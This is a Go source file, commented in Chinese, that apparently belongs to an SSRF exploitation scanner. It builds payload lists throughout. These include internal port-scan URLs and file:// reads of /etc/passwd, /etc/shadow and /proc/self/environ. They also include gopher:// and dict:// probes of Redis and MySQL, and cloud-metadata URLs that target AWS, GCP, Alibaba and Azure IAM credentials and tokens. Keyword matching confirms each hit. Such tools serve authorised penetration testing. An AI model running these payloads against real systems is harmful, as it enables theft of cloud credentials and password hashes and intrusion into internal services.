package payloads

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Payload payload结构
type Payload struct {
	Value    string
	Type     string
	Keywords []string
}

// GetPortScanPayloads 获取端口扫描payload
// internalIPs: 要扫描的内网IP列表，如果为空则只扫描127.0.0.1
// customPorts: 自定义端口列表，如果为空则使用默认高危端口
func GetPortScanPayloads(internalIPs []string, customPorts []int) []Payload {
	var payloads []Payload

	// 决定要扫描的端口列表
	var portsToScan []int
	if len(customPorts) > 0 {
		portsToScan = customPorts
	} else {
		// 默认高危端口
		portsToScan = []int{
			6379, 3306, 5432, 27017, 9200, 11211, 5984, 2375,
			8086, 9000, 5000, 8080, 8888, 80, 443, 22, 21, 3389, 445,
		}
	}

	// 决定要扫描的IP列表
	var targetIPs []string
	if len(internalIPs) > 0 {
		targetIPs = internalIPs
	} else {
		targetIPs = []string{"127.0.0.1", "localhost", "0.0.0.0"}
	}

	// 生成HTTP协议的端口扫描payload
	for _, ip := range targetIPs {
		for _, port := range portsToScan {
			payloads = append(payloads, Payload{
				Value:    fmt.Sprintf("http://%s:%d", ip, port),
				Type:     "端口扫描",
				Keywords: getServiceKeywordsByPort(port),
			})
		}
	}

	return payloads
}

// GetHighRiskPayloads 获取高危协议和文件读取payload（默认扫描）
func GetHighRiskPayloads() []Payload {
	return []Payload{
		// 高危文件读取
		{
			Value:    "file:///etc/passwd",
			Type:     "文件读取",
			Keywords: []string{"root:", "bin:", "daemon:", "nobody:"},
		},
		{
			Value:    "file:///etc/shadow",
			Type:     "文件读取",
			Keywords: []string{"root:", "$6$", "$5$"},
		},
		{
			Value:    "file:///etc/hosts",
			Type:     "文件读取",
			Keywords: []string{"localhost", "127.0.0.1"},
		},
		{
			Value:    "file:///proc/self/environ",
			Type:     "文件读取",
			Keywords: []string{"PATH=", "HOME=", "USER="},
		},
		{
			Value:    "file:///c:/windows/win.ini",
			Type:     "文件读取",
			Keywords: []string{"[fonts]", "[extensions]", "for 16-bit app support"},
		},
		{
			Value:    "file:///c:/windows/system32/drivers/etc/hosts",
			Type:     "文件读取",
			Keywords: []string{"localhost", "127.0.0.1"},
		},

		// 高危协议探测
		{
			Value:    "dict://127.0.0.1:6379/info",
			Type:     "协议探测",
			Keywords: []string{"redis_version", "tcp_port", "role:"},
		},
		{
			Value:    "gopher://127.0.0.1:6379/_INFO",
			Type:     "协议探测",
			Keywords: []string{"redis_version", "tcp_port"},
		},
		{
			Value:    "gopher://127.0.0.1:3306/_GET",
			Type:     "协议探测",
			Keywords: []string{"mysql", "MariaDB"},
		},
		{
			Value:    "dict://127.0.0.1:3306/",
			Type:     "协议探测",
			Keywords: []string{"mysql", "MariaDB"},
		},
	}
}

// GetCloudMetadataPayloads 获取云服务元数据payload（默认扫描）
func GetCloudMetadataPayloads() []Payload {
	return []Payload{
		// AWS 元数据
		{
			Value:    "http://169.254.169.254/latest/meta-data/",
			Type:     "云元数据",
			Keywords: []string{"ami-id", "instance-id", "security-credentials"},
		},
		{
			Value:    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			Type:     "云元数据",
			Keywords: []string{"AccessKeyId", "SecretAccessKey", "Token"},
		},
		{
			Value:    "http://169.254.169.254/latest/user-data/",
			Type:     "云元数据",
			Keywords: []string{"user-data", "script"},
		},

		// Google Cloud 元数据
		{
			Value:    "http://metadata.google.internal/computeMetadata/v1/",
			Type:     "云元数据",
			Keywords: []string{"instance", "project", "service-accounts"},
		},
		{
			Value:    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
			Type:     "云元数据",
			Keywords: []string{"access_token", "token_type"},
		},

		// 阿里云元数据
		{
			Value:    "http://100.100.100.200/latest/meta-data/",
			Type:     "云元数据",
			Keywords: []string{"instance-id", "region-id"},
		},
		{
			Value:    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
			Type:     "云元数据",
			Keywords: []string{"AccessKeyId", "AccessKeySecret"},
		},

		// Azure 元数据
		{
			Value:    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
			Type:     "云元数据",
			Keywords: []string{"compute", "network", "vmId"},
		},
	}
}

// GetOOBPayloads 获取OOB测试payload
func GetOOBPayloads(oobServer string) []Payload {
	if oobServer == "" {
		return []Payload{}
	}

	return []Payload{
		{
			Value:    fmt.Sprintf("%s/callback?id=http-test", oobServer),
			Type:     "OOB检测",
			Keywords: []string{},
		},
		{
			Value:    fmt.Sprintf("%s/callback?id=https-test", oobServer),
			Type:     "OOB检测",
			Keywords: []string{},
		},
	}
}

// GetAllDictPayloads 从dict目录加载所有字典文件的payload
func GetAllDictPayloads() []Payload {
	var allPayloads []Payload

	// dict目录下的所有字典文件
	dictFiles := []string{
		"dict/bypass_techniques.txt",
		"dict/cloud_metadata.txt",
		"dict/file_read.txt",
		"dict/protocol_bypass.txt",
		"dict/internal_ip.txt",
	}

	// 逐个加载字典文件
	for _, dictFile := range dictFiles {
		payloads, err := loadDictFile(dictFile)
		if err != nil {
			// 忽略加载失败的文件，继续加载其他文件
			fmt.Printf("[*] 加载字典文件失败 %s: %v\n", dictFile, err)
			continue
		}
		allPayloads = append(allPayloads, payloads...)
	}

	return allPayloads
}

// loadDictFile 从单个字典文件加载payload
func loadDictFile(filePath string) ([]Payload, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var payloads []Payload
	scanner := bufio.NewScanner(file)

	// 从文件名推断payload类型
	payloadType := getPayloadTypeFromFileName(filePath)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// 跳过空行和注释
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// 创建payload
		payloads = append(payloads, Payload{
			Value:    line,
			Type:     payloadType,
			Keywords: getKeywordsByPayload(line),
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return payloads, nil
}

// getPayloadTypeFromFileName 从文件名推断payload类型
func getPayloadTypeFromFileName(filePath string) string {
	fileName := filepath.Base(filePath)

	typeMap := map[string]string{
		"bypass_techniques.txt": "绕过技术",
		"cloud_metadata.txt":    "云元数据",
		"file_read.txt":         "文件读取",
		"protocol_bypass.txt":   "协议绕过",
		"internal_ip.txt":       "内网探测",
	}

	if pType, ok := typeMap[fileName]; ok {
		return pType
	}
	return "自定义字典"
}

// getKeywordsByPayload 根据payload内容推断关键字（用于响应检测）
func getKeywordsByPayload(payload string) []string {
	var keywords []string

	// 云元数据关键字
	if strings.Contains(payload, "169.254.169.254") || strings.Contains(payload, "metadata") {
		return []string{"AccessKeyId", "SecretAccessKey", "Token", "credentials", "ami-id", "instance-id"}
	}

	// 文件读取关键字
	if strings.Contains(payload, "file://") {
		if strings.Contains(payload, "passwd") {
			return []string{"root:", "bin:", "daemon:", "nobody:"}
		}
		if strings.Contains(payload, "shadow") {
			return []string{"root:", "$6$", "$5$", "$1$"}
		}
		if strings.Contains(payload, "hosts") {
			return []string{"localhost", "127.0.0.1"}
		}
		if strings.Contains(payload, "win.ini") {
			return []string{"[fonts]", "[extensions]", "for 16-bit app support"}
		}
		// 通用文件读取特征
		return []string{"root:", "PATH=", "HOME=", "Administrator"}
	}

	// 协议探测关键字
	if strings.Contains(payload, "dict://") || strings.Contains(payload, "gopher://") {
		if strings.Contains(payload, "6379") {
			return []string{"redis_version", "PONG", "role:master"}
		}
		if strings.Contains(payload, "3306") {
			return []string{"mysql", "MariaDB"}
		}
	}

	return keywords
}

// getServiceKeywordsByPort 根据端口获取服务特征关键字（用于端口扫描检测）
func getServiceKeywordsByPort(port int) []string {
	portToKeywords := map[int][]string{
		6379:  {"redis_version", "PONG", "role:master"},
		3306:  {"mysql", "MariaDB", "Access denied"},
		5432:  {"PostgreSQL", "FATAL"},
		27017: {"MongoDB", "unauthorized"},
		9200:  {"cluster_name", "version", "tagline", "elasticsearch"},
		11211: {"STAT", "version"},
		2375:  {"Containers", "Images"},
		80:    {"HTTP/", "Server:", "<html"},
		443:   {"HTTP/", "Server:", "<html"},
		8080:  {"HTTP/", "Server:", "<html"},
		8888:  {"HTTP/", "Server:", "<html"},
	}

	if kw, ok := portToKeywords[port]; ok {
		return kw
	}
	return []string{"HTTP/", "Server:"}
}
